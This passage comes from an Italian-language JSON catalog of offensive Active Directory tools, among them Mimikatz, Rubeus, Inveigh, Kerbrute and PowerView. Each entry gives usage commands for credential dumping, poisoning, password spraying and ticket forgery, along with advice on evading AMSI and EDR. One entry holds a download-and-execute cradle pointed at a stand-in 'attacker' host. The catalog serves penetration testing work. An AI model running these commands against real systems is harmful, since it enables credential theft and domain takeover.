Listener SMB/HTTP)\nInveigh.exe\n\n# Avvio con parametri specifici (IP spoofing, disabilita NBNS)\nInveigh.exe -IP 192.168.1.50 -NBNS N\n\n# Modalità sola analisi (senza spoofing attivo)\nInveigh.exe -Inspect</code></pre><p>Durante l'esecuzione, premere <code>ESC</code> per entrare nella console di gestione e visualizzare le catture in tempo reale con comandi come <code>GET NTLMV2</code> o <code>GET USERS</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Inveigh è fondamentale nelle fasi iniziali di un <strong>Internal Pentest</strong> per ottenere rapidamente credenziali valide sfruttando il traffico di background della rete.</p><p>È particolarmente efficace la mattina presto o dopo i riavvii, quando i PC cercano risorse di rete. In scenari di <strong>Red Teaming</strong>, la versione compilata è preferita alla versione PowerShell per evitare le detection AMSI e i log di script block, offrendo maggiore stabilità in lunghe sessioni di ascolto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso a livello di rete. IDS/IPS rilevano facilmente risposte non sollecitate o anomale ai protocolli broadcast. Defender for Identity segnala attività di spoofing.</p><p><strong>Impatto operativo:</strong> Può causare conflitti IP o malfunzionamenti di rete se configurato male. Il relay SMB può bloccare l'accesso alle risorse legittime per la vittima durante l'attacco.</p><p><strong>Mitigazioni:</strong> Usare whitelist/blacklist per targettizzare solo macchine specifiche. Disabilitare protocolli legacy (NBNS) se non necessari. Limitare la durata dell'attacco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "inveigh-ps1",
    "name": "Inveigh.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Versione PowerShell legacy di Inveigh per attacchi MITM fileless e spoofing LLMNR/NBNS in ambienti con restrizioni sui binari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.ps1</strong> è la versione originale in PowerShell del tool di spoofing. Sebbene la versione EXE sia più performante, lo script PS1 rimane vitale per scenari \"fileless\" o \"living off the land\", dove caricare binari compilati sul disco è impossibile o troppo rischioso. Offre le stesse capacità core di poisoning LLMNR/NBNS e cattura credenziali, eseguendo tutto in memoria all'interno di un processo PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Esecuzione Fileless:</strong> Può essere caricato direttamente in memoria (es. tramite download cradle) senza toccare il disco, bypassando controlli antivirus basati su file statici.</p><p><strong>Spoofing & Capture:</strong> Gestisce lo spoofing dei nomi e l'ascolto su protocolli HTTP/SMB per catturare challenge NTLM. Include funzionalità per output formattato compatibile con Hashcat.</p><p><strong>Integrazione Framework:</strong> Essendo uno script, è facilmente integrabile in framework di C2 come Empire o Covenant, o eseguibile tramite sessioni di gestione remota (WinRM) esistenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo ed invocare la funzione principale. Richiede privilegi amministrativi locale.</p><pre><code># Import ed esecuzione base\nImport-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y\n\n# Esecuzione stealth con download in memoria e timer di stop\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')\nInvoke-Inveigh -RunTime 10 -Tool 2 -IP 192.168.1.50</code></pre><p>Utilizzare <code>Stop-Inveigh</code> per terminare i job di ascolto in background e pulire le risorse di rete.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Lateral Movement</strong> su host dove non si vuole lasciare artefatti binari. Se si compromette una workstation con restrizioni sull'esecuzione di EXE ma con PowerShell abilitato, Inveigh.ps1 permette di trasformare l'host in un punto di ascolto per catturare credenziali di altri utenti (es. admin di dominio) che navigano nella stessa subnet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto vulnerabile a <strong>AMSI</strong> (Antimalware Scan Interface) e <strong>Script Block Logging</strong>. La maggior parte degli EDR moderni bloccherà l'esecuzione dello script se non offuscato pesantemente.</p><p><strong>Impatto operativo:</strong> L'esecuzione prolungata in PowerShell può consumare risorse. Stessi rischi di rete della versione EXE.</p><p><strong>Mitigazioni:</strong> Usare offuscatori (es. Invoke-Obfuscation) prima del caricamento. Preferire la versione C# se si dispone di un metodo per eseguire binari, usare PS1 solo come fallback.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-win",
    "name": "kerbrute_Windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool in Go per enumerazione utenti e password spraying veloce e stealth sfruttando la pre-autenticazione Kerberos (porta 88).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos per enumerare utenti validi e testare password, offrendo un'alternativa molto più rapida e furtiva rispetto ai metodi tradizionali basati su SMB o LDAP. Poiché interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, evita di generare i rumorosi log di \"Logon Failure\" (Event ID 4625) tipici dei tentativi NTLM, rendendo l'attività molto più difficile da rilevare per i difensori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> Sfrutta il fatto che il KDC restituisce codici di errore diversi se un utente esiste (<code>KDC_ERR_PREAUTH_REQUIRED</code>) o meno (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>). Questo permette di validare liste di username enormi in pochi secondi senza inviare alcuna password.</p><p><strong>Password Spraying:</strong> Esegue tentativi di login massivi provando una password contro molti utenti. Se il login ha successo, ottiene un TGT; se fallisce, genera un errore Kerberos. Questo metodo è più veloce del protocollo SMB e non rischia di bloccare l'account se usato correttamente (una sola password).</p><p><strong>Nessun requisito di dominio:</strong> Può essere eseguito da una macchina fuori dominio (es. laptop dell'attaccante in VPN), purché abbia visibilità di rete verso il Domain Controller, rendendolo perfetto per le fasi iniziali di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il binario standalone non richiede installazione. È fondamentale puntare al Domain Controller corretto.</p><pre><code># Enumerazione utenti validi da una wordlist\nkerbrute_windows.exe userenum -d domain.local --dc 192.168.1.10 users_list.txt\n\n# Password Spraying (Check password 'Welcome1')\nkerbrute_windows.exe passwordspray -d domain.local users.txt \"Welcome1\"\n\n# Verifica singola credenziale (Brute force - sconsigliato massivamente)\nkerbrute_windows.exe bruteuser -d domain.local passwords.txt username</code></pre><p>L'output evidenzia in verde le credenziali valide trovate, che possono essere usate immediatamente per accessi VPN, OWA o SMB.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, Kerbrute è lo standard per ripulire liste di utenti generate tramite OSINT (es.</p><p>LinkedIn) e ottenere un elenco di target validi. Nel <strong>Password Spraying</strong>, è preferito per la sua velocità e per la minore impronta nei log di sicurezza standard di Windows, aggirando regole SIEM basate solo su eventi 4625.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene non generi 4625, genera eventi 4771 (Kerberos Pre-Auth Failed). Un volume anomalo di 4771 da un singolo IP è un IoC chiaro per Defender for Identity e SOC avanzati.</p><p><strong>Impatto operativo:</strong> Basso rischio di lockout se usato in modalità spray (1 password). Attenzione alla modalità brute-force che bloccherà account.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>--safe</code> (se disponibile nella build) o introdurre delay manuali. Non eseguire da un IP che non si vuole bruciare. Alternare i DC target se presenti multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/gentilkiwi/mimikatz",
    "desc": "Il framework definitivo per credential dumping, manipolazione ticket Kerberos e attacchi avanzati ad Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> è lo strumento che ha rivoluzionato la sicurezza di Windows, dimostrando le debolezze strutturali nella gestione delle credenziali in memoria. Consente agli attaccanti di estrarre password in chiaro, hash NTLM, ticket Kerberos e certificati direttamente dal processo LSASS (Local Security Authority Subsystem Service). Oltre al dumping, è una piattaforma completa per generare token di accesso falsi (Golden/Silver Tickets) e manipolare il funzionamento della crittografia di dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Dumping (Sekurlsa):</strong> Il modulo più noto, capace di leggere la memoria di LSASS per recuperare le credenziali di tutti gli utenti loggati (incluso WDigest, SSP, MSV1_0). Se configurato, può recuperare password in chiaro anche su versioni recenti di Windows.</p><p><strong>Kerberos Manipulation:</strong> Permette di eseguire attacchi Pass-the-Ticket (PTT), Pass-the-Key (PTK) e di creare ticket contraffatti come il Golden Ticket (TGT valido per 10 anni con diritti di Domain Admin) e Silver Ticket (accesso a servizi specifici), garantendo persistenza a lungo termine.</p><p><strong>DCSync:</strong> Simula il comportamento di un Domain Controller per richiedere la replicazione dei dati degli utenti (inclusi gli hash delle password) via protocollo MS-DRSR, permettendo di ottenere credenziali di tutti gli utenti del dominio senza eseguire codice sul DC reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mimikatz dispone di una console interattiva. Richiede privilegi di Debug (spesso ottenuti come Admin/SYSTEM).</p><pre><code># Avvio e acquisizione privilegi debug\nmimikatz # privilege::debug\n\n# Dump password e hash da LSASS\nmimikatz # sekurlsa::logonpasswords\n\n# Esecuzione DCSync (da utente con diritti di replica, es. Domain Admin)\nmimikatz # lsadump::dcsync /domain:lab.local /user:Administrator\n\n# Creazione Golden Ticket\nmimikatz # kerberos::golden /user:FakeAdmin /domain:lab.local /sid:S-1-5... /krbtgt:hash... /id:500 /ptt</code></pre><p>Può essere eseguito anche \"oneliners\" passando i comandi come argomenti all'eseguibile: <code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong> e <strong>Lateral Movement</strong>, è lo strumento primario per trasformare un accesso locale in un compromesso di dominio (tramite credential theft).</p><p>Per la <strong>Persistence</strong>, i Golden Ticket e Skeleton Key offrono backdoor resilienti. I Blue Team lo utilizzano per verificare l'efficacia delle protezioni come Credential Guard e Protected Users Group.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Mimikatz è la \"firma\" più cercata al mondo. I binari su disco sono bloccati da qualsiasi AV. L'accesso alla memoria di LSASS genera eventi Sysmon (ID 10) e alert EDR critici. DCSync genera eventi di accesso agli oggetti AD (4662).</p><p><strong>Impatto operativo:</strong> Manipolare LSASS può causare Blue Screen of Death (BSOD) se non eseguito con cautela o versioni compatibili. Usare con estrema attenzione su server di produzione.</p><p><strong>Mitigazioni:</strong> Mai usare il binario standard. Eseguire via PowerShell in memoria (Invoke-Mimikatz) con offuscamento pesante, o meglio, usare tecniche di dumping alternative (es. ProcDump, Comsvcs) e analizzare il dump offline con Mimikatz sulla propria macchina.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Credential_Dump"
    ],
    "notes": null
  },
  {
    "id": "pingcastle",
    "name": "PingCastle",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.pingcastle.com/download/",
    "desc": "Scanner di sicurezza per Active Directory che genera report dettagliati su rischi, health check e mappa delle relazioni di trust.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PingCastle</strong> è uno strumento di audit progettato per valutare rapidamente il livello di sicurezza di un ambiente Active Directory. Basato su un modello di maturità (CMMI), analizza le configurazioni del dominio e genera un report HTML intuitivo che evidenzia i rischi, assegnando un punteggio di pericolo. È ampiamente utilizzato per identificare vulnerabilità strutturali, relazioni di trust dimenticate e account obsoleti che potrebbero essere sfruttati dagli attaccanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Health Check & Risk Scoring:</strong> Esegue centinaia di controlli di sicurezza (es. LAPS mancante, SMBv1 attivo, amministratori in gruppi a rischio) e calcola un punteggio di rischio aggregato, permettendo di prioritizzare le azioni correttive.</p><p><strong>Mappatura Trust & Forest:</strong> Visualizza graficamente le relazioni di trust tra domini e foreste, evidenziando trust bidirezionali pericolosi verso ambienti meno sicuri o di test.</p><p><strong>Stale Object Analysis:</strong> Identifica utenti e computer inattivi (\"stale\"), che rappresentano una superficie d'attacco inutile e dovrebbero essere disabilitati o rimossi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PingCastle è un eseguibile standalone che può essere lanciato con un account utente standard di dominio (l'accesso in lettura è sufficiente per quasi tutti i check).</p><pre><code># Modalità interattiva (menu guidato)\nPingCastle.exe\n\n# Healthcheck automatico sul dominio corrente\nPingCastle.exe --healthcheck --server domain.local\n\n# Scansione di domini in trust\nPingCastle.exe --scanner trust</code></pre><p>Al termine, genera un report HTML nella cartella di esecuzione, navigabile via browser, con spiegazioni dettagliate per ogni finding e raccomandazioni per la remediation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato regolarmente dai <strong>System Administrator</strong> per mantenere l'igiene dell'AD e prepararsi agli audit.</p><p>Per i <strong>Penetration Tester</strong>, è eccellente nelle fasi iniziali per ottenere una visione d'insieme delle debolezze strutturali del cliente (es. \"Quick Wins\") senza generare traffico di attacco, guidando le fasi successive verso i punti più deboli dell'infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume sostenuto di traffico LDAP e query verso il DC. Sebbene sia traffico legittimo di lettura, l'intensità può essere notata.</p><p><strong>Impatto operativo:</strong> Basso. L'operazione è di sola lettura.</p><p><strong>Mitigazioni:</strong> Proteggere i report generati poiché contengono la mappa completa delle vulnerabilità dell'azienda.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "powerupsql",
    "name": "PowerUpSQL",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NetSPI/PowerUpSQL",
    "desc": "Toolkit PowerShell per discovery, audit e privilege escalation su istanze SQL Server enterprise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerUpSQL</strong> è un framework offensivo dedicato all'attacco delle infrastrutture Microsoft SQL Server. Permette di scoprire istanze SQL sparse nella rete, verificare configurazioni deboli (come password di default o account sa vuoti) ed eseguire escalation dei privilegi. È particolarmente potente nello sfruttare le catene di \"Linked Servers\" per muoversi lateralmente tra database e ottenere esecuzione di codice sul sistema operativo sottostante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Massiva:</strong> Trova server SQL tramite query SPN, broadcast UDP e scansioni mirate, mappando rapidamente la superficie d'attacco database dell'azienda.</p><p><strong>Linked Server Crawling:</strong> La feature più temibile: segue automaticamente i link tra database server per trovare percorsi che portano a server critici o dove l'utente ha privilegi elevati (spesso sysadmin), permettendo di saltare da un DB di test a uno di produzione.</p><p><strong>Command Execution:</strong> Automatizza l'abilitazione e l'uso di procedure come <code>xp_cmdshell</code>, <code>Ole Automation Procedures</code> o assembly CLR malevoli per passare dall'accesso SQL all'esecuzione di comandi shell come SYSTEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo PowerShell.</p><pre><code># Discovery istanze nel dominio\nGet-SQLInstanceDomain\n\n# Audit rapido delle configurazioni di default\nGet-SQLInstanceDomain | Invoke-SQLAudit\n\n# Crawling automatico dei link per trovare privilegi sysadmin\nGet-SQLInstanceDomain | Get-SQLServerLinkCrawl -Verbose\n\n# Esecuzione comandi OS su istanza vulnerabile\nInvoke-SQLOSCmd -Instance \"SQLSRV01\" -Command \"whoami\" -Verbose</code></pre><p>Il comando <code>Invoke-SQLAudit</code> genera un report CSV con le vulnerabilità identificate per ogni istanza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Network Pentest</strong>, i database SQL sono spesso il \"ventre molle\": patchati raramente e configurati con account di servizio privilegiati.</p><p>PowerUpSQL permette di sfruttare un accesso database limitato per ottenere il controllo completo del server e usarlo come pivot. In <strong>Data Exfiltration</strong>, facilita l'individuazione e l'estrazione di dati sensibili da tabelle critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'abilitazione di <code>xp_cmdshell</code> è un evento ad alta criticità monitorato dai SIEM. Scansioni di discovery e login falliti generano log applicativi SQL.</p><p><strong>Impatto operativo:</strong> L'esecuzione di comandi o query pesanti può degradare le performance del DB. Modificare configurazioni globali può impattare le applicazioni.</p><p><strong>Mitigazioni:</strong> Ripristinare sempre le configurazioni (es. disabilitare xp_cmdshell) dopo l'uso. Limitare il crawling a target specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "powerview-ps1",
    "name": "PowerView.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PowerShellMafia/PowerSploit",
    "desc": "Script PowerShell di PowerSploit per ricognizione Active Directory pura: enumera utenti, gruppi, trust e sessioni senza dipendenze esterne.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerView è uno degli strumenti di enumerazione offensiva più iconici per ambienti Active Directory. Scritto interamente in PowerShell, non utilizza moduli RSAT amministrativi ma interagisce direttamente con le API Win32 e LDAP per mappare il dominio. È progettato per ottenere \"Situational Awareness\" completa: capire chi sono gli admin, dove sono loggati e quali relazioni di trust esistono, il tutto vivendo \"off-the-land\" senza introdurre binari compilati sospetti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User & Group Hunting:</strong> Funzioni come <code>Invoke-UserHunter</code> e <code>Find-LocalAdminAccess</code> sono vitali per il movimento laterale. Scansionano la rete per individuare su quali macchine sono attive sessioni di utenti privilegiati o dove l'utente corrente ha diritti di amministratore locale.</p><p><strong>Enumerazione ACL & GPO:</strong> Permette di analizzare le Access Control List (<code>Get-DomainObjectAcl</code>) per trovare \"strade nascoste\" di escalation (es. un utente che può resettare la password di un admin) e di leggere le Group Policy per identificare policy di sicurezza deboli o script di avvio modificabili.</p><p><strong>Mappatura Trust:</strong> Con <code>Get-DomainTrust</code> e <code>Get-ForestTrust</code>, visualizza le relazioni logiche tra domini, essenziale per pianificare attacchi che attraversano i confini della foresta AD (es. da un dominio child compromesso al root parent).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo in memoria (spesso bypassando AMSI prima).</p><pre><code># Caricamento e info base dominio\nImport-Module .\\PowerView.ps1\nGet-Domain\n\n# Trovare dove sono loggati i Domain Admin\nInvoke-UserHunter -GroupName \"Domain Admins\" -Stealth\n\n# Enumerare share di rete leggibili in tutto il dominio\nInvoke-ShareFinder -CheckShareAccess -Verbose</code></pre><p>Molte funzioni accettano filtri LDAP raw per query di precisione chirurgica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, è lo strumento primario per rispondere alla domanda \"Dove vado ora?\".</p><p>Se si compromette un utente, PowerView rivela immediatamente se quell'utente ha accesso speciale (es. RDP su un server critico) o se appartiene a gruppi annidati interessanti. In fase di <strong>Privilege Escalation</strong>, l'analisi delle ACL spesso rivela la via più silenziosa per diventare Domain Admin senza usare exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PowerView è pesantemente firmato dai vendor antivirus. L'esecuzione su disco è quasi sempre bloccata. AMSI intercetta le funzioni caricate in memoria. Le scansioni di rete (es. UserHunter) generano traffico SMB/RPC verso molti host.</p><p><strong>Mitigazioni:</strong> Utilizzare versioni offuscate o eseguire via C2 che supportano l'esecuzione in memoria (come Cobalt Strike <code>powershell-import</code>). Preferire query LDAP mirate (<code>Get-DomainUser</code>) rispetto a scansioni attive (<code>Invoke-UserHunter</code>) se il monitoraggio è alto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "responder-windows",
    "name": "Responder-Windows",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/Responder-Windows",
    "desc": "Versione Windows (spesso Python script) di Responder per LLMNR/NBT-NS poisoning e cattura hash NTLM in reti locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene Responder sia nativo Linux, questa variante permette l'esecuzione su macchine Windows (spesso usando l'interprete Python installato). Esegue lo stesso compito critico: ascoltare richieste broadcast di risoluzione nomi (LLMNR/NBT-NS) e rispondere falsamente per dirottare il traffico verso l'attaccante, catturando hash NTLMv2 degli utenti vittima.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Poisoning:</strong> Risponde a query per nomi host errati, fingendo di essere il server destinazione.</p><p><strong>Auth Capture:</strong> Simula server SMB/HTTP/SQL per forzare i client a inviare le credenziali di autenticazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python su Windows.</p><pre><code># Avvio standard su interfaccia specifica\npython Responder.py -I \"Ethernet0\" -wrf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest (Windows-only):</strong> Se si ha accesso a una VM Windows nella rete target ma non si può introdurre una macchina Linux/Kali, questa versione permette di eseguire comunque attacchi MITM per catturare credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. I moderni Defender rilevano l'ascolto su porte NetBIOS/LLMNR e le risposte rapide.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rpcdump-windows",
    "name": "rpcdump_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/csandker/RPCDump",
    "desc": "Utility per enumerare endpoint RPC (porta 135), mappare interfacce UUID e identificare servizi nascosti o vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RPCDump è uno strumento diagnostico essenziale per la fase di ricognizione interna. Interroga il servizio RPC Endpoint Mapper (sulla porta TCP 135) di un host remoto per ottenere l'elenco completo delle interfacce RPC registrate, i loro UUID, i protocolli di binding e le annotazioni. Questa visibilità permette di identificare servizi non standard, versioni di software specifiche e potenziali target vulnerabili (es. vecchie interfacce vulnerabili a MS08-067 o PrintNightmare) che non apparirebbero in una normale scansione di porte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Endpoint:</strong> Estrae la lista degli endpoint dinamici e statici, rivelando quali porte effimere sono in ascolto per servizi specifici (es. DHCP, DNS management, servizi proprietari).</p><p><strong>Analisi UUID:</strong> Permette di correlare gli UUID universali trovati con servizi noti. Ad esempio, la presenza di UUID specifici può indicare l'installazione di software di backup o di gestione remota vulnerabile.</p><p><strong>Service Discovery:</strong> Identifica servizi che non rispondono alle scansioni SYN standard ma sono raggiungibili tramite Named Pipes o RPC over HTTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool è una semplice utility a riga di comando che richiede l'IP del target.</p><pre><code># Enumerazione base verso un target remoto\nrpcdump.exe -p 192.168.1.10\n\n# Enumerazione verbose con dettagli sui binding\nrpcdump.exe -v -p 192.168.1.10</code></pre><p>L'output elencherà ogni interfaccia con il formato <code>UUID vMajor.Minor (Annotation) [Binding]</code>. Analizzare le annotazioni per identificare rapidamente software interessanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In una fase di <strong>Discovery approfondita</strong>, RPCDump aiuta a mappare la superficie d'attacco reale di un server Windows, rivelando servizi che potrebbero essere firewallati sulle porte standard ma esposti via RPC. È utile anche per confermare la presenza di patch: se un'interfaccia vulnerabile nota non è più listata o ha cambiato versione, è probabile che il sistema sia stato aggiornato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La connessione alla porta 135 e l'interrogazione dell'Endpoint Mapper sono traffico legittimo ma, se eseguite in sequenza su molti host, costituiscono un chiaro pattern di ricognizione.</p><p><strong>Impatto operativo:</strong> Nullo, è una query informativa standard.</p><p><strong>Mitigazioni:</strong> Eseguire scansioni mirate piuttosto che sweeping sull'intera subnet.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "rubeus-exe",
    "name": "Rubeus.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/GhostPack/Rubeus",
    "desc": "Il coltellino svizzero C# per Kerberos abuse: TGT requests, roasting, ticket extraction, pass-the-ticket e monitoraggio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Rubeus è lo standard de facto per la manipolazione di Kerberos in ambienti Windows. Scritto in C# per integrarsi con framework .NET e Cobalt Strike, permette di eseguire quasi ogni attacco noto contro Kerberos: dalla richiesta di ticket (AS-REQ) all'iniezione in memoria (Pass-the-Ticket), fino al roasting (Kerberoast/ASREPRoast) e all'intercettazione di ticket al volo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Roasting & Harvesting:</strong> Esegue Kerberoasting e AS-REP Roasting in modo stealth, estraendo hash crackabili.</p><p><strong>Ticket Management:</strong> Può estrarre ticket (TGT/TGS) da sessioni di altri utenti (dump), iniettarli nella sessione corrente (ptt) o rinnovarli.</p><p><strong>Advanced Attacks:</strong> Supporta S4U (Constrained Delegation abuse), Diamond Ticket, Sapphire Ticket e manipolazione di ticket per Golden/Silver ticket attacks.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da riga di comando o via execute-assembly.</p><pre><code># Kerberoasting stealth con output su file\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Pass-the-Ticket (iniezione file kirbi)\nRubeus.exe ptt /ticket:administrator.kirbi\n\n# Monitoraggio nuovi ticket (harvesting)\nRubeus.exe monitor /interval:10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Lateral Movement & Persistence:</strong> Tool onnipresente in ogni fase. Dopo l'accesso iniziale, si usa per l'escalation (Roasting). Dopo aver ottenuto admin, si usa per persistenza (Golden Ticket) o movimento laterale (Overpass-the-hash).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rubeus è pesantemente firmato. L'uso in memoria è soggetto a scan AMSI e comportamentale. Tecniche come <code>monitor</code> o iniezioni ticket massicce sono rumorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "securityassessment-ps1",
    "name": "SecurityAssessment.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script PowerShell per audit automatico della postura di sicurezza Windows/AD, verifica hardening e compliance a best practices.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecurityAssessment.ps1</strong> è uno script di audit progettato per valutare rapidamente il livello di hardening di workstation e server Windows. A differenza dei tool offensivi, il suo scopo è difensivo o di \"situational awareness\": analizza centinaia di impostazioni di configurazione (GPO, Registry, Audit Policy, Patch level) e le confronta con le best practice di sicurezza (es. CIS Benchmarks, Microsoft Security Baselines), generando un report dettagliato sulle lacune identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Configurazione Sistema:</strong> Verifica lo stato di UAC, AppLocker, BitLocker, Credential Guard e servizi vulnerabili attivi. Controlla le impostazioni di SMB (v1 disabilitato, signing richiesto) e protocolli di rete obsoleti (LLMNR/NBT-NS).</p><p><strong>Audit Policy & Logging:</strong> Analizza se il sistema sta registrando gli eventi critici necessari per la rilevazione di attacchi (es. Command Line Auditing, PowerShell Script Block Logging, Logon Events).</p><p><strong>Account & Privilegi:</strong> Identifica account locali inattivi, membri del gruppo Administrators locale e configurazioni dei diritti utente (User Rights Assignment) che deviano dai valori sicuri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script da una shell amministrativa. Non richiede installazione.</p><pre><code># Esecuzione standard con generazione report\nPS C:\\> .\\SecurityAssessment.ps1\n\n# Esecuzione con output in cartella specifica\nPS C:\\> .\\SecurityAssessment.ps1 -OutputPath C:\\Audit\\Reports</code></pre><p>Al termine, esaminare il file HTML o CSV generato per prioritizzare le remediation in base alla gravità dei riscontri (Rosso/Giallo/Verde).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Usato dai <strong>Blue Team</strong> per verificare la conformità delle \"Golden Image\" prima del deployment.</p><p>Per i <strong>Penetration Tester</strong>, se si ha accesso fisico o RDP a una macchina, fornisce una lista immediata di vettori di Privilege 